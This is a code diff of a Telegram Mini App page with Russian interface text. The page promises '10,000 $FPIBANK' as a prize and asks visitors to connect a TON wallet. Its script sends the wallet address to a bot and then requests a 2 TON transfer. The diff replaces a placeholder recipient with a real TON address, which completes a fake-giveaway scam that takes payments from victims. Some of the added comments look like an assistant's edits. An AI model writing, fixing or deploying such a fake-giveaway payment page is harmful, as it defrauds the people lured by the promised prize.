@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Mini App</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -49,7 +49,7 @@
 <body>
     <div class="container">
         <img src="https://raw.githubusercontent.com/RFRFQRFARFQF/Telegram-mini-app/main/photo.jpg" alt="Фото">
-        <p>ПОЛУЧИТЬ 10.000$FPIBANK</p>  <!-- Оставил твой оригинальный текст -->
+        <p>ПОЛУЧИТЬ 10.000$FPIBANK</p>
         <p>ПОДКЛЮЧИ КОШЕЛЕК ДЛЯ ПОЛУЧЕНИЯ ПРИЗА</p>
         <button id="connect-wallet">CONNECT WALLET</button>
     </div>
@@ -58,8 +58,9 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
 
+        // Инициализация TON Connect
         const tonConnect = new TONConnect({
-            manifestUrl: "https://raw.githubusercontent.com/RFRFQRFARFQF/Telegram-mini-app/main/tonconnect-manifest.json"
+            manifestUrl: "https://rfrfqrfarfqf.github.io/Telegram-mini-app/tonconnect-manifest.json"
         });
 
         document.getElementById("connect-wallet").addEventListener("click", async function() {
@@ -68,13 +69,15 @@
                 if (connectedWallet) {
                     const walletAddress = connectedWallet.account.address;
                     
+                    // Отправляем кошелек в бота
                     tg.sendData(JSON.stringify({ wallet: walletAddress }));
 
                     tg.showAlert("Кошелек подключен: " + walletAddress);
 
+                    // Создаём транзакцию на 2 TON
                     const transaction = {
-                        to: "EQC3DQ...ЗАМЕНИТЕ_НА_АДРЕС",
-                        value: "2000000000",
+                        to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc",  // Вставь реальный адрес получателя
+                        value: "2000000000",  // 2 TON (в нанотонах)
                         payload: "",
                     };
 
@@ -85,11 +88,10 @@
                 tg.showAlert("Ошибка: " + error.message);
             }
         });
-
-        
     </script>
 </body>
 </html>
+
 
 
         Telegram.WebApp.ready();
